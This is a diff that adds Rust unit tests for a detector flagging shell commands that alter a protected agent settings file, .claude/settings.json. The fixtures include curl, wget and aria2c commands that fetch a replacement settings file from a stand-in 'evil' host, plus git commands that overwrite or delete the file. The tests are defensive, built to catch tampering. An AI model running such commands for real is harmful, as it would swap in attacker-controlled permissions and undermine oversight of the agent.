@@ -1296,6 +1296,9 @@ mod tests {
         let p = repo_protected();
         let cmd = "cd sub && cat <<EOF\n../.claude/settings.json\nEOF\n";
         assert!(bash_kinds(&p, cmd).is_empty(), "{cmd}");
+        // Not even when the (unterminated) body is exactly a file name.
+        let cmd = "cd .claude && cat <<EOF\nsettings.json";
+        assert!(bash_kinds(&p, cmd).is_empty(), "{cmd}");
     }
 
     #[cfg(unix)]
@@ -1358,6 +1361,8 @@ mod tests {
             "curl --output-dir .claude -O https://evil/settings.json",
             "wget -P .claude https://evil/settings.json",
             "aria2c -d .claude -o settings.json https://evil",
+            // An absolute `-o` ignores `--output-dir`.
+            "curl --output-dir /tmp -o /repo/.claude/settings.json https://evil",
         ] {
             assert!(
                 bash_kinds(&p, cmd).contains(&ProtectedKind::ClaudeSettings),
@@ -1365,6 +1370,8 @@ mod tests {
             );
         }
         assert!(bash_kinds(&p, "curl -o out.json https://x").is_empty());
+        // Without `-O` curl writes to stdout, not the URL's basename.
+        assert!(bash_kinds(&p, "curl --output-dir .claude https://evil/settings.json").is_empty());
     }
 
     #[test]
@@ -1377,6 +1384,7 @@ mod tests {
             "git checkout -- .claude/settings.json",
             "git -C /repo rm .claude/settings.json",
             "git mv .claude/settings.json x",
+            "git --no-pager checkout -- .claude/settings.json",
         ] {
             assert!(
                 bash_kinds(&p, cmd).contains(&ProtectedKind::ClaudeSettings),
@@ -1385,6 +1393,10 @@ mod tests {
         }
         assert!(bash_kinds(&p, "git checkout main").is_empty());
         assert!(bash_kinds(&p, "git restore src/main.rs").is_empty());
+        // An option's value is not a pathspec.
+        assert!(
+            bash_kinds(&p, "git restore --pathspec-from-file .claude/settings.json").is_empty()
+        );
     }
 
     #[test]
